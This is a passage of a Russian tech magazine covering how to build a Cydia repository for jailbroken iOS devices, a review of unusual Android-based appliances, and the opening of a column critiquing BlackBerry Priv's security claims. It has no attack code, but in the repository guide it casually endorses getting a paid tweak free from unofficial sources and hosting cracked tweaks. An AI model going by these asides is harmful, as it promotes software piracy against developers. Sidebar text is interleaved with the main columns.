грамм для взломанных iOS-устройств служат репози-
тории — особенным образом созданные сайты, откуда
можно скачать исполняемые файлы с помощью Cydia.
Есть мнжество разных причин для создания собственно-
го репохитория: кто-то хочет заработать деньги на рекла-
ме, кто-то рассматривает репозиторий как добавочный
элемент своего файлообменника, кто-то просто желает
собрать самые полезные твики, дать им понятные описа-
ния и сделать доступными для пользователя. Как бы то ни
было, репозиторий не очень сложен в создании.

СПОСОБ ДЛЯ ЛЕНИВЫХ
В Сети существуют тысячи репозиториев, и было бы очень странно, если бы не
существовало ни одного сервиса для их автоматического создания и напол-
нения. Такие сервисы действительно есть, как в виде веб-сайтов, так и в виде
отдельных приложений для iOS.
   Ранее особенной популярностью пользовался портал MyRepoSpace. Несмо-
тря на довольно медленную работу размещенных в нем репозиториев, он отли-
чался понятным интерфейсом и бесплатностью. К сожалению, на данный момент
сайт удален, а надпись It was fun вряд ли поможет пользователю в задуманном
деле. Однако существует не менее функциональная альтернатива — YouRepo.

                                                              Главная страница
                                                             YouRepo
                                                            Управление пакета-
                                                      ми YouRepo





Здесь есть возможность сделать красочное описание, создать страницу опла-
ты твиков, загрузить пакеты. После незатейливой регистрации добавлять тви-
ки очень просто и удобно. Базовых возможностей здесь хватит практически
всем: скриншоты, гибкие настройки параметров, аналитика и расширение при
помощи встроенного магазина. Останавливает одно — слишком мало места
для начала, слишком много придется докупать. Цены небольшие, но для эф-
фективной работы с репозиторием понадобится совершать немало покупок.
  Нужно ли использовать YouRepo для своего репозитория? Решение бу-
дет такое же, как и в случае с вопросом, использовать ли CMS для создания
сайта или написать все вручную. Автоматизированность, многофункциональ-
ность — преимущества первого варианта, а количество потенциальных воз-
можностей за меньшие деньги — второго. Если ты планируешь длительную
поддержку репозитория, раскрутку и продвижение и в конечном счете полу-
чение дохода, стоит попробовать поднять репозиторий самостоятельно. Из-
начально он, конечно, очень неудобный, но намного более надежный, недо-
рогой и расширяемый.

ПРАВИЛЬНЫЙ СПОСОБ
Во многих статьях в Сети можно встретить мнение, что лучшая (а может, и един-
ственная) система для создания репозиториев — Ubuntu или Debian (репо-
зитории Cydia полностью базируются на технологиях этих дистрибутивов. —
Прим. ред.). На самом деле Linux действительно во многом будет удобней, но
в целом ничто не мешает попробовать и на любой другой платформе.
   Структура репозитория проста и логична. Обязательны фактически лишь
два файла: Release и Packages. В первом содержится информация о самом ре-
позитории, а во втором — о пакетах, которые в него входят. Кроме того, в корне
необходима заархивированная копия Packages, содержание которой должно
полностью совпадать с первым файлом. В подавляющем большинстве случа-
ев также создается каталог для пакетов, иногда в корне располагаются файлы
с языковыми локализациями (хотя поддержка нескольких языков — редкость
даже для известных репозиториев). Рассмотрим, каким образом следует за-
полнять файлы Packages и Release.
  В файле Release данные, как правило, статичны. Они меняются только при
смене базовых настроек репозитория. Структура файла следующая:
•  Origin: полное название репозитория;
•  Label: краткое название репозитория. При вставке длинного имени оно
   просто не влезет на экран Cydia;
•  Version: версия репозитория;
•  Architectures: правильным будет параметр iphoneos-arm;
•  Components: должно быть установлено значение main;
•  Description: развернутое описание репозитория.

Обрати внимание, что все поля должны быть заполнены правильно, иначе ре-
позиторий не будет работать. Кроме того, желательно оставить пустую строку
после последней строки. Не забывай и про установку правильной кодировки:
кроме UTF-8, Cydia ничего не понимает. Файл не должен иметь расширения.
   Packages, в отличие от Release, изменяется при добавлении каждого ново-
го твика. Его функция описательная: показать, где находится пакет, дать воз-
можность его отыскать, прикрепить к нему описание и данные. Packages мо-
жет иметь немало опций, однако наиболее часто встречаются:
•  Name: имя твика, которое будет отображаться в репозитории;
•  Size: размер пакета в байтах. Необходимо указать точные данные;
•  Maintainer: сборщик твика;
•  Section: секция, в которой будет размещен твик. Наиболее часто использу-
  емые — Tweaks, Themes, Games, но можно указать любое значение. Необ-
   ходимо для структурирования репозитория. Данное поле обязательно для
   заполнения, и при его отсутствии источник не установится;
•  Author: автор пакета;
•  Version: версия пакета;
•  HomePage: домашняя страница с дополнительной информацией;
•  Architecture: здесь единственно верным будет значение iphoneos-arm;
•  Package: точное название пакета, которое будет использовано для того,
   чтобы найти его в папке с пакетами;
•  Filename: каталог, где размещаются пакеты (/ — корень репозитория,
   а /dir — произвольная папка);
•  Description: полное описание твика;
•  MD5Sum: уникальный код MD5, генерируемый индивидуально для каждого
   пакета. О его создании чуть ниже.
Параметры могут быть расставлены в произвольном порядке, однако должны
быть заполнены для корректного отображения твика. Также можно заполнить
другие поля: Depends (устанавливаемые зависимости), Pre-Depends (необхо-
димые зависимости), Conflicts (конфликты с другими пакетами). При добавле-
нии твиков с зависимостями желательно также загружать соответствующие
утилиты в репозиторий. Файл не должен иметь расширения, кодировка долж-
на соответствовать стандарту UTF-8.





Заполненный файл Release





Заполненный файл Packages              Ошибка при добавлении пакета с пустым
                                      полем Section
Сумма MD5 должна обязательно при-
сутствовать в файле. Для ее генерации
есть приложения и для Mac, и для
Windows. Например, для OS X оно назы-
вается MD5 и присутствует как в виде
программы с графическим интерфей-
сом, так и в качестве терминальной ути-
литы. Для того чтобы вычислить значе-
ние, необходимо ввести команду md5, а
далее полный путь к файлу. Ответ мож-
но вывести и в сокращенном формате,  Программа MD5 для Mac
для этого используй параметр -r.
  Для вычисления суммы в среде
Windows есть несколько терминаль-
ных утилит и WinMD5Free с графиче-
ским интерфейсом. Подробности об
использовании  программы  можно
узнать на официальном сайте разра-                                                INFO
ботчика.
  После создания файлов Packages      Во многих источниках есть указание, что поле
                                                                  Depiction должно присутствоватьи Release необходимо заархивиро-                                                       в файле /DEBIAN/control самого deb-пакета.
вать Packages. На Windows для созда-     Однако экспериментально было выяснено, что
ния gz-файла пригодится популярный     достаточно упоминания в Packages, отредактиро-
                                                       вать который значительно проще, чем сам пакет7-Zip. На Mac выручит терминал: не-                                                          твика. Поля Maintainer и Author в Packages-файле
обходимо ввести gzip -f -k и далее      репозитория могут содержать ссылку в формате
указать путь к файлу Packages.               <ссылка>, например для указания почты разра-
   Таким образом, на данный момент       ботчика. Основной источник ошибок в репозито-
                                                   рии — файл Packages. При его неправильном за-
имеется  четыре  файла:  Packages,                                                    полнении Cydia может не распознать репозиторий,
Packages.gz,  Release  и  deb-пакет     отобразить его пустым или с пустыми категориями.
в папке, которая указана в Packages.     Поэтому большую часть ошибок можно исправить,
                                                      отредактировав данный файл и обновив источникиДля того чтобы репозиторий стал до-                                                        в Cydia. Нетрудно заметить, что после работы
ступен пользователям, его можно за-     скрипта для автоматизации поле MD5Sum будет
лить на хостинг, который поддержива-    заполнено немного не так, как надо, — в нем будет
                                                      указан также адрес файла, для которого вычис-ет передачу данных по FTP и позволяет
                                                     лялась сумма. Однако это никак не повлияет на
загрузить файлы в корень сайта.                                                          работоспособность репозитория.
   Есть и другой способ — создать
сервер на домашней машине. Для работы репозитория не нужны MySQL
или PHP — достаточно будет установки веб-сервера Apache. На Mac Apache
(2.4.16 в актуальной версии системы) входит в стандартный комплект постав-
ки OS X. Для его активации необходимо выполнить команду sudo apachectl
start в терминале и ввести пароль администратора. После этого при вводе
localhost в браузере появится надпись «It works!». Для того чтобы репозиторий
был доступен по адресу «localhost/название папки репозитория», необходимо
скопировать его в /Library/WebServer/Documents.
   Запуск Apache на Windows сложнее. Актуальный релиз не распространя-
ется в виде установочного файла. Тем не менее некоторые версии в виде .msi
можно найти в архивах сайта apache.org. При установке появится возможность
задать имя сервера (стандартное — localhost). После установки по умолча-
нию пакет будет находиться в Program Files. В каталоге conf можно найти файл
httpd.conf, при помощи которого настраивается название сервера (параметр
ServerName) и расположение папки с сайтами (параметр DocumentRoot). По
умолчанию документы хранятся в папке htdocs установленной программы, где
и следует расположить директорию репозитория.
   Apache запускается автоматически после установки и при каждом включе-
нии компьютера, кроме того, в меню «Пуск» должен появиться ярлык для пере-
запуска сервера.

НАПОЛНЯЕМ РЕПОЗИТОРИЙ
Разумеется, бессмысленно создавать репозито-
рий для одного твика, поэтому его необходимо
постоянно наполнять. Для добавления нового па-
кета можно выполнить несколько простых шагов.
Во-первых, удали файлы Packages и Packages.gz с
сервера или отредактируй их, если имеется такая          INFO
возможность.                                                        В Linux есть команда dpkg
   Во-вторых, удали Packages.gz с компьютера                                                                     scanpackages -m, которая
и открой файл Packages. После пустой строки под      формирует файл Packages
последней строчкой описания первого твика за-     автоматически, собирая дан-
                                                             ные о deb-пакетах на компью-
полни такую же форму для следующего. Сохрани                                                                           тере. Теоретически сходный
файл, выполни команду gzip -f -k в его отноше-    функционал должна обеспечи-
нии и залей оба файла на хостинг, а затем скачай       вать утилита Fink для Mac,
                                                                    для установки которой тре-туда сам deb-пакет. На этом процесс наполнения                                                                       буется XCode Command Line
заканчивается, а чтобы увидеть внесенные изме-     Tools и Java. Однако в качестве
нения, необходимо обновить репозитории в Cydia.        вывода данная команда
                                                                      создает лишь пустой файл   Новички часто забывают о том, что необходимо
                                                                       Packages, соответственно,
обновлять файлы Packages из хостинга. Тем не ме-                                                                  смысла в установке
нее именно этот файл — своего рода ключ ко всем           практически нет.
твикам источника, и при отсутствии упоминания
о файле в нем и в Cydia пакет также не будет виден.
РЕПОЗИТОРИЙ ПРЯМО В IOS
Создать репозиторий можно прямо на своем iOS-девайсе. Для этого разра-
ботан твик iRepo, стоящий всего 2 доллара (понятное дело, скачать его можно
бесплатно из неофициальных источников). Управление пакетами очень про-
стое, но здесь не найти многих возможностей полноценного сервиса. Для того
чтобы пакеты появились в программе, необходимо добавить их в каталог
/private/var/mobile/iRepo. Можно добавить защиту репозитория паролем,
описание для него и выполнять другие базовые операции.





Список пакетов iRepo                     Добавление пакетов iRepo
Не стоит использовать iRepo для серьезных проектов. Во-первых, програм-
ма нестабильна и часто «вылетает», лишь частично совместима с последними
версиями iOS. Во-вторых, в ней мало возможностей, а доступа к коду нет. По-
этому создать репозиторий при помощи данной программы можно разве что
интереса ради.



ДОБАВЛЕНИЕ ДОПОЛНИТЕЛЬНЫХ ЭЛЕМЕНТОВ
В РЕПОЗИТОРИЙ И НА СТРАНИЦЫ ТВИКОВ
Большинство репозиториев имеют собственные иконки, и добавить свою не
составит труда. Это должно быть изображение размером 59 х 59 или 72 х 72
пикселя в формате PNG и с названием CydiaIcon. Файл необходимо располо-
жить в корне репозитория. Иконка появится в Cydia через некоторое время,
возможно даже сразу после заливки.
   Намного более трудоемкой процедурой станет добавление красочного
описания к твикам, которое присутствует в большинстве крупных репозитори-
ев. Здесь часто располагают скриншоты и дополнительные виджеты, напри-
мер совместимость с конкретной версией прошивки. Сам блок расположен
под разделом «Автор» и представляет собой не что иное, как HTML-страницу,
называемую здесь Depiction.
  Для добавления Depiction необходимо вписать в файл Packages строку
Depiction: и указать ссылку на HTML-файл без расширения. После добавления
Depiction строку с Description необходимо убрать. Особых рекомендаций по
наполнению страницы нет, однако следует учесть, что в Cydia инструменты для
масштабирования отсутствуют, а значит, ширину страницы необходимо подо-
гнать под ширину дисплея. Также лучше не делать скриншоты длиной более
300 пикселей.
  В остальном же работа с Depiction в Cydia такая же, как и с любой другой
веб-страницей. Поддерживаются PHP, HTML, CSS, JavaScript, поэтому при на-
личии знаний в области веб-программирования сделать годное описание для
пакета не составит труда. Таким же образом на страницу пакета добавляется
реклама, которую можно встретить практически во всех репозиториях.
  Многие разработчики задаются вопросом, как добавить в репозиторий
платный твик. Однако на данный момент такую возможность имеют лишь круп-
нейшие репозитории. К тому же в них утилита наверняка будет более популяр-
на, чем в собственном источнике, потому разработчикам, которые хотят полу-
чить награду за свой труд, лучше выложить созданный ими пакет в популярных
BigBoss или ModMyi.
ВОЗМОЖНОСТИ АВТОМАТИЗАЦИИ
Регулярное наполнение Packages, добавление и удаление файлов грозят
ошибками при работе с репозиторием, самые распространенные из кото-
рых — опечатки, незамененные архивированные копии файлов, отсутствие
важных записей в Packages. Готовые решения по автоматизации процесса не
найти в открытом доступе, хотя они могут предоставляться как часть сервисов
по созданию источников.
  Для того чтобы избежать существенного количества ошибок при добавле-
нии, был написан небольшой скрипт для OS X, проводящий основную часть
операций в автоматическом режиме. Ты найдешь его на странице GitHub жур-
нала. Для работы скрипта необходимо установить программу MD5, а также
терминальную утилиту cURL, если ее еще нет на твоем компьютере. Разумеет-
ся, понадобится также нативное приложение AppleScript Editor.
Обрати внимание на формат ввода данных, который указан
в default answer. Знаки / необходимо расставлять таким обра-
зом, как это указано в примере.
   Скрипт совсем не идеален, при помощи его нет возможно-
сти обновить файл, к примеру. Однако при этом он выполняет                                    WWW
свою основную функцию — добавление твиков в репозиторий.
                                                                               YouRepo
ЗАКЛЮЧЕНИЕ                                                                 MD5
Стоит ли создавать репозиторий и поддерживать его в дальней-
шем? Как и в ситуации с сайтами, создание окажется намного     WinMD5Free
легче, чем раскрутка. Сейчас такие проекты выделяются коли-
                                                                                     BigBoss
чеством пакетов, в том числе и взломанных твиков из других по-
пулярных репозиториев, детальной информацией о твиках со       ModMyi
скриншотами и поддержкой нескольких языков.
 MOBILE
 РОБОТЫ 



                                                                           Роман Ярыженко
                                                                                              rommanio@yandex.ru В ТВОЕМ ДОМЕ
 ОБЗОР ЭКЗОТИЧЕСКИХ УСТРОЙСТВ
 НА ОСНОВЕ ANDROID
Спектр устройств на основе платформы от Google
постоянно расширяется. Если во времена первых версий
Android предназначался исключительно для мобильных,
то позже к ним добавились планшеты, еще позже — умные
часы, а сейчас вообще появилась бытовая техника на его
основе — хотя, безусловно, пока что это экзотика. В этой
статье мы и поговорим об экзотике: фотоаппаратах, холо-
дильниках, микроволновках и даже умных зеркалах.

ВВЕДЕНИЕ
Технологии IoT незаметно проникают в нашу жизнь. В 2005 году у большинства
населения (по крайней мере в России) был аналоговый телевизор; сейчас же у
многих появился цифровой с выходом в Сеть. У музыкальных центров сейчас
тоже появился выход в Сеть — или, во всяком случае, поддержка UPnP.
  Все это совпало с распространением Android, поэтому неудивительно, что
производители решили скомбинировать данную платформу и «умную технику».
В итоге получились довольно любопытные вещички — например, у Samsung
есть фотоаппараты на основе Android. Но Samsung — известный любитель
Android, и на данный фотоаппарат не стоило бы обращать внимания, если бы
не существовала аналогичная модель от Nikon.
   Однако фотоаппараты — далеко не всё. На основе платформы от Google
существует немало иных устройств, о которых мы и расскажем. Но начнем все
же с фотоаппаратов.

ФОТОАППАРАТЫ
Сегодня абсолютное большинство смартфонов поставляется с фотокамерой,
которой обычно хватает для создания праздничных (и не очень) снимков сред-
него качества — большее, в общем-то, требуется только эстетам. Это, конеч-
но, никак не могло понравиться именитым производителям фотокамер, и один
из них, Nikon, в августе 2012-го анонсировал фотоаппарат-беззеркалку на ос-
нове Android 2.3. Следом же, в ноябре, начались продажи аналогичного фото-
аппарата от Samsung.
 Samsung Galaxy Camera                        Nikon Coolpix S800c

По аппаратным характеристикам они примерно похожи, разве что у Samsung
декларируемые характеристики — как оптические, так и технические — чуть
выше. Кроме того, в южнокорейском фотоаппарате используется четырехъя-
дерный процессор Exynos 4412, а в японском, помимо ARM Cortex A9, на кото-
ром и крутится Android, еще и фирменный процессор обработки изображений
Expeed C2.
  Перейдем к программной начинке. В Samsung Galaxy Camera использует-
ся Android 4.1 с фирменной оболочкой TouchWiz, самую малость модифици-
рованной под фотоаппарат, — при этом разработчики даже не удосужились
убрать из некоторых пунктов меню наименование «телефон». В фотоаппарате
есть GSM-модуль, однако возможность звонить заблокирована (что не меша-
ет использовать Skype). Также на нем можно играть и запускать любые прило-
жения Android. Платить же за все это приходится временем холодного запуска,
которое может достигать двадцати секунд, что для устройств данного типа во-
обще неприемлемо.
   Конкурирующая модель от Nikon использует Android 2.3. При этом, однако,
есть два режима работы — собственно режим фотоаппарата и режим Android,
что несколько отличает устройство от южнокорейского конкурента и чуть сме-
щает акценты: если у Samsung это «гаджет на базе Android, предназначенный
для фотосъемок», то у Nikon это в первую очередь именно фотоаппарат, а уж
затем все прочее. Интерфейс у Android никак не модифицирован, GSM-мо-
дуль отсутствует, есть Wi-Fi и GPS. Во время холодного запуска (те же самые
двадцать секунд) все элементы управления заблокированы, но это не мешает
фотографировать в автоматическом режиме.
  B общем, идея выглядит интересной — а учитывая, что у Samsung с тех пор
появился не один фотоаппарат с Android на борту, даже и популярной. Тем не
менее для профессиональной съемки подобные гаджеты не очень годятся —
все же назначение у гуглоплатформы слишком общее, что по отношению к ни-
шевым устройствам, к которым можно причислить и фотоаппараты высокого
класса, выглядит довольно нелепо.
ТЕЛЕВИЗОРЫ
Существует модификация Android для телевизоров под названием Android
TV. Раньше уже была попытка выйти на этот рынок, но она благополучно про-
валилась из-за различий маркетов и прочего. Сейчас же это самый обычный
Android 5 с модифицированным лаунчером, собственным разделом в Google
Play, включающим в том числе такие приложения, как Netflix и Kodi (бывший
XBMC), но без сенсорного экрана.
   Приложения требуется немного модифицировать, чтобы они запускались
на телевизорах: предоставить activity для обработки интента action.Main ка-
тегории LEANBACK_LAUNCHER, добавить ресурсы, специфичные для Android
TV, и указать, что приложение будет использовать D-pad. Кроме того, оформ-
ление приложения не должно включать в себя строку меню и панель инстру-
ментов — без сенсорного экрана их использовать довольно неудобно.
  На примере телевизора Sony 55W807C оценим энергопотребление:
•  спящий режим — 16 Вт;
•  просмотр обычного ТВ — 72 Вт;
•  просмотр белого JPG на максимальной яркости — 92 Вт.

                                                        Один из умных
                                                             телевизоров от Sony





В целом Android TV выглядит очень перспективно — прежде всего потому, что
это позволит унифицировать платформы умного ТВ. Другой вопрос, хватит ли
у «корпорации добра» ресурсов, чтобы продавить свою платформу произво-
дителям ТВ.
МИКРОВОЛНОВКИ И ДУХОВКИ
Да! Android есть даже в микроволновках и духовках. Существует аж три ми-
кроволновки под управлением гуглоплатформы. Первая (от компании Touch
Revolution) была представлена на CES 2010. Потом об Android на данной тех-
нике, очевидно, забыли и вспомнили лишь в 2013 году на все той же CES —
в этот раз «первопроходцем» была названа калифорнийская компания Dacor.
И третий раз Android на микроволновку решила портировать индийская фирма
SectorQube. Назвали эту микроволновку MAID, что расшифровывается либо
как Make All Incredible Dishes, либо как Microwave Android Integrated Device.
  MAID умеет рассказывать, что и как необходимо сделать, чтобы приготовить
то или иное блюдо, — рецепты он (точнее, она — ибо голос у микроволновки
женский) ищет в Сети, к которой подключается по Wi-Fi. Расшаривание своих
рецептов также возможно и даже приветствуется. Управляется сие чудо тех-
нической мысли индийского народа либо с помощью шестидюймового экра-
на, либо голосом (пока, правда, доступен только английский язык). Также для
управления можно использовать мобильные приложения, идущие с ней в ком-
плекте. Но самая интересная особенность состоит в том, что микроволновка
может определять, чего именно не хватает потребителю, и рекомендовать по-
лезный рацион или после калорийной еды посоветовать пробежку.
  Команда разработчиков (семь человек) создала прототип примерно за
полгода — однако на данный момент, судя по Kickstarter, по неизвестным при-
чинам дело застопорилось. Планируемая цена была 125–145 долларов.





                                      Панель управления «умной духовкой»Микроволновка MAID, умеющая
                                             от Dacorназначать диеты
Духовка же разработана упомянутой компанией Dacor. Имеется семидюймо-
вый мультитач-дисплей. Процессор Samsung SSPV210 1 ГГц, с ядром Cortex
A8. ОЗУ — 512 Мбайт DDR2, флеш-память — 16 Гбайт. Возможно поставить
еще и внешнюю SD-карту. И конечно же, Wi-Fi с Bluetooth. Работает на Android
4.0.3. Цена вопроса: 4500 долларов за вариант с одной духовкой и 7500 дол-
ларов — с двумя.

ХОЛОДИЛЬНИКИ
Уже есть целых два холодильника под
управлением Android — оба от компа-
нии Samsung. На первой модели, анон-
сированной в 2012 году, установлен
10,1-дюймовый планшет, включающий
в себя такие приложения, как Epicurious
для поиска рецептов и  Evernote для
создания (и синхронизации) заметок,
что из еды купить. Ну и конечно же, на
нем можно серфить интернет и остав-
лять заметки в твиттере (что, безуслов-
но, и нужно от холодильника с Android
на борту). Вторая модель, представ-
ленная на выставке CES 2016, осна-
щена уже планшетом диагональю 21
дюйм и разрешением 1080. Внутри
холодильника стоят камеры, позволя-
ющие определить (в том числе и уда-
ленно), что в нем есть, — это полезно,
если человек забывчив и хочет наблю-
дать в реальном времени, как портятся
продукты, — для последнего, правда,
нужно обладать железным терпением.
Кроме того, в Корее с него можно даже
заказывать еду!
                                           Чудо-холодильник, позволяю-
  На практике это опять-таки прото-                                  щий смотреть продукты,
типы, и до их серийного выпуска ждать    не открывая дверцу
придется неведомо сколько.
«СВЕТ МОЙ, ЗЕРКАЛЬЦЕ, СКАЖИ...»
Японская фирма со смешным для русского уха названием Seraku разработала
в 2012 году «умное зеркало». Оно представляет собой монитор с полупрозрач-
ным стеклом, камерой и датчиком движения, в теории позволяющим обходить-
ся вообще без прикосновений. Разработчики позиционируют его как устрой-
ство  для  отелей,  баров,  ресторанов  и  парикмахерских. Оно  может
использоваться для чтения новостей, сводок погоды и прочего — можно даже
примерять прическу. И разумеется, на борту стоит Android.

                                                           Зеркало с Android





К сожалению, за рамки прототипа оно, судя по всему, так и не вышло.

REMIX MINI
Это устройство позиционируется как дешевая замена ПК. Разрабатывается оно
китайской фирмой, основанной экс-сотрудниками Google. В общем-то, оно ни-
чем бы не отличалось от остальных подобных устройств, работающих по HDMI,
если бы не программная начинка. Но сначала — об аппаратной части. Устройство
представляет собой круглую коробку размером 12,6 x 8,8 x 2,6 см. Процессор —
четырехъядерный 64-битный Cortex A53, 1,2 ГГц. Количество памяти зависит (как
оперативной, так и внутреннего хранилища) от модификации — от 1 до 2 Гбайт
оперативной и от 8 до 16 Гбайт флеш. Доступные (помимо HDMI) интерфейсы:
•  2 USB 2.0;
•  Ethernet;
•  наушники;
•  microSD.

Кроме того, поддерживается Wi-Fi, в том числе и 5 ГГц.
  А вот в качестве программной части там стоит сильно модифицированный
вариант Android, именуемый Remix OS. Декларируются (и уже реализованы)
такие возможности, как реальная, многооконная многозадачность (соответ-
ственно, кнопки сворачивания/разворачивания тоже), старая добрая панель
задач с главным меню и треем, полноценная поддержка привычных комбина-
ций клавиш и мыши (в том числе правой кнопки) — и при всем этом данный
клон полноценно поддерживает если не все, то очень многие приложения, до-
ступные в Google Play.

                                                           Мини-неттоп
                                                            Remix Mini





Проект собрал более полутора миллионов долларов на Kickstarter. Это уже
не прототип, а реально продаваемое железо. Единственное но — исходники
Remix OS они открывают только партнерам.

ЧАСЫ
До появления Android Wear были вариан-
ты умных часов с обычным Android на борту.
Одно из таких устройств разработала китай-
ская фирма Omate — подразделение китай-
ского производителя смартфонов Umeox.
Часы назывались Omate Truesmart и собра-
ли около миллиона долларов на Kickstarter.
Существуют как старшая модель часов, так
и младшая. Посмотрим на их начинку:
•  дисплей 1,54 дюйма;
•  масса около 100 г;
•  процессор MediaTek MT6572 (1,3 ГГц);
• ОЗУ от 512 Мбайт до 1 Гбайт;
•  флеш-память от 4 до 8 Гбайт;
•  GSM/3G/Wi-Fi/Bluetooth;
•  аккумулятор 600 мА · ч;                     Часы с полноценным Android
•  Android 4.2.2.
Фактически часы представляют собой полноценный телефон с Android, только
маленький. Часы позиционируются как водостойкие. На руке носить их доволь-
но некомфортно из-за их веса. Камера (5 Мп) расположена на торце, поэтому
нужно выработать навык съемки подобным устройством, в противном случае
будет видно часть руки. Аккумулятора хватает примерно на день, индикация
заряда, впрочем, оставляет желать лучшего. Зарядка сделана крайне неудоб-
но — часы нужно вставлять в коробку-кредл.
  К сожалению, Google не сертифицировала эти часы — соответственно,
Google Play на них нет. Однако его было довольно легко установить, так как все
библиотеки и фреймворки, требуемые для его работы, уже были в комплекте.
Оставалось только установить APK. Цена на часы на момент выпуска состав-
ляла 250/300 долларов — за младшую и старшую модель соответственно. Не-
давно Omate выпустила обновленный вариант часов с Android 5.1 на борту.

ДРУГИЕ УСТРОЙСТВА,
УПРАВЛЯЕМЫЕ С ПОМОЩЬЮ ANDROID
Android может использоваться для управления техникой, даже если не уста-
новлен в нее:
•  Кофеварка Textpresso, сделанная для демонстрации облачного сервиса
   мгновенных сообщений Zipwhip. Некоммерческая затея, исключительно
   для маркетинговых целей.
•  Satis Smart  Toilet — унитаз с Bluetooth, контролируемый с помощью
   Android-приложения. Была найдена уязвимость (стандартный PIN 0000),
  позволяющая кому угодно спускать воду.


ЗАКЛЮЧЕНИЕ
Подобные устройства выглядят довольно забавно, особен-
но если говорить о бытовых. Но настолько ли они полезны?
  Прежде всего, встраивать SoC в устройства не состав-
ляет сейчас особых проблем. С программной составляю-
щей, однако, могут возникнуть некоторые проблемы — в
первую очередь из-за сложности современного ПО. И если    WWW
сбой в телевизоре или «умных часах» хоть и неприятен, но не
                                                                                   Сайт, посвященный
смертелен, то сбой в духовке вполне может при определен-                                                                                   архитектуре IoT
ных условиях привести к пожару, а сбой в стиральной маши-
не — к затоплению (на самом деле за «рабочие» функции в таких устройствах
отвечает отдельный SoC с собственной ОС, такой же, как у обычных моделей,
так что волноваться не стоит. — Прим. ред.). Не стоит также забывать и о злоу-
мышленниках — при определенных условиях через те же умные часы возможна
прослушка, а то и съемка с фото/видео (без ведома владельца, конечно же).
  В итоге выходит, что именно для бытовой техники больше подходит цен-
трализованное управление, где весь «интеллект» сосредоточен в одном ме-
сте. Это, конечно, с одной стороны, немного понижает общую безопасность
(взлом управляющего центра приравнивается к взлому всей бытовой техники),
однако с другой — это же и упрощает сопровождение; не нужно заморачи-
ваться по поводу EoL для прошивки холодильника или обновления ПО микро-
волновки.
   Таким образом, тенденция ставить Android в каждое бытовое (и не очень)
устройство видится достаточно безрассудной. Нет, в тех же телевизорах он
смотрится очень даже органично, однако, к примеру, в холодильнике он вы-
глядит довольно нелепо. С той или иной степенью вероятности можно про-
гнозировать, впрочем, что производители сами откажутся от идеи встраивать
Android во все подряд. Время покажет.
MOBILE: Колонка Евгения Зобнина
БЛЕСК И НИЩЕТА
BLACKBERRY PRIV





                      Евгений Зобнин
                                      androidstreet.net



Свойственные платформе Android гибкость и открытость
вместе с пришедшими позже популярностью и фрагмента-
цией привели к тому, что в головах простых пользователей
прочно закрепилась идея об общей небезопасности систе-
мы. И конечно же, быстро нашлись люди, которые начали на
этом спекулировать. Сначала подключились разработчики
антивирусов, а затем и производители смартфонов. Но так
ли на самом деле безопасны эти самые смартфоны по срав-
нению с обычными? Попробуем разобраться.
Существует несколько проектов смартфонов, работающих под управлением
Android с якобы усиленной безопасностью. Есть среди них как совсем смеш-
ные разработки типа GATCA: Elite, так и на первый взгляд довольно серьез-
ные устройства от именитых компаний. Наиболее известный представитель
вторых — это BlackBerry Priv, о котором компания написала множество ста-
тей и блог-постов. Один из них носит очень претенциозное название «Почему
Android от BlackBerry — лучший выбор в плане безопасности и приватности».
  Сам пост довольно короткий и, кроме нескольких абзацев маркетингового
булшита, содержит список функций, которые делают их Android таким крутым.
Я приведу этот список целиком, стараясь не слишком искажать смысл сказан-
ного (хотя в некоторых местах это сделать довольно сложно из-за изначально
неверного смысла):
•  реализация доверенной загрузки всех компонентов ОС (маркетинговое
  имя Root of Trust, аналог UEFI Secure boot);
•  улучшения в поддержке технологии ASLR, что делает эксплуатацию уязви-
   мостей намного более трудной задачей;
•  улучшения в системе мандатного контроля доступа SELinux;
•  утилита Pathtrust, гарантирующая, что непроверенный код не будет внедрен
   в систему через вредоносное ПО;
•  множество модификаций в ядре Linux и Android в целом, введенных для
   поддержки DTEK, фирменного приложения для обеспечения безопасности
   и приватности;
•  сертифицированная по стандарту FIPS 140-2 криптобиблиотека и другие
   улучшения, направленные на защиту паролей от brute-force-атак;
•  поддержка смарт-карт и другие Enterprise-функции, необходимые биз-
нес-пользователям.

Звучит неплохо, не правда ли? Особенно если ты человек, плохо понимающий
Android и описанные технологии. Однако давай пройдемся по каждому из этих
пунктов и разберемся, о чем конкретно говорит BlackBerry и так ли все хорошо
на самом деле.

ДОВЕРЕННАЯ ЗАГРУЗКА
BlackBerry не зря поставила эту технологию на первое место. Root of Trust —
это действительно хорошая идея, позволяющая подтвердить целостность
системы на всех уровнях, начиная с загрузчика. Реализована она с помощью
сверки контрольной суммы загрузчика, с последующей сверкой контрольной
суммы ядра ОС, проверкой SHA-хеша раздела /system и сверкой контрольных
сумм установленных приложений. Все это в несколько искаженном виде пока-
зано на рисунке ниже.
                                                                 Root of Trust





Говоря простым языком, Root of Trust гарантирует, что ни загрузчик, ни ядро,
ни сама система, ни даже установленные приложения не были изменены с мо-
мента прошлой загрузки. Например, если ты случайно подхватил особо хитрый
зловред, который сумел получить root и внедриться в одно из установленных
легитимных приложений или даже ядро ОС, то во время следующей загрузки
система это определит и откатится к предыдущему состоянию.
  Все это замечательно, но есть как минимум две проблемы.
   Первая: система защищает именно от зловредов, способных получить до-
ступ к компонентам системы или другим приложениям, а это возможно только
при наличии прав root. Большинство зловредов не такие, обычно они исполь-
зуют вполне легитимные функции системы, а если и получают root, то никуда
не внедряются, а спокойно живут себе в своей песочнице, по-тихому похищая
данные или следя за пользователем.
   Вторая: BlackBerry не дает никаких пояснений по поводу реализации дан-
ной функции. Как и где хранятся ключи и хеши? Как они защищены? Как систе-
ма хранит хеши установленных приложений и можно ли получить к ним доступ,
имея права root? Другими словами, насколько бОльшую безопасность пре-
доставляет Root of Trust по сравнению с обычным залоченным загрузчиком,
который точно так же откажется загружать систему при изменении ядра? Пока
на эти вопросы не будет дан ответ, система ничем не лучше идеи залоченных
загрузчиков.
   Ну и как мы все знаем, все подобные системы убивают любые возможно-
сти модификации прошивок, рутинга, установки Xposed или смены прошивки.
Через годик-другой BlackBerry выпустит Priv 2 и забьет на текущий смартфон.
А еще через годик в нем найдут дыру и пользователи окажутся не защищены.
Да, через три года смартфон уже пора и выкинуть, но это вовсе не аргумент
(та же Apple до сих пор обновляет iPhone 4S, например). Но я могу быть и не
прав, и BlackBerry будет поддерживать смартфон лет пять.

УЛУЧШЕНИЯ В ПОДДЕРЖКЕ ASLR
Технология ASLR (Address space layout randomization) появилась как ответ на
разные виды атак, направленных на переполнение буфера, и впервые была
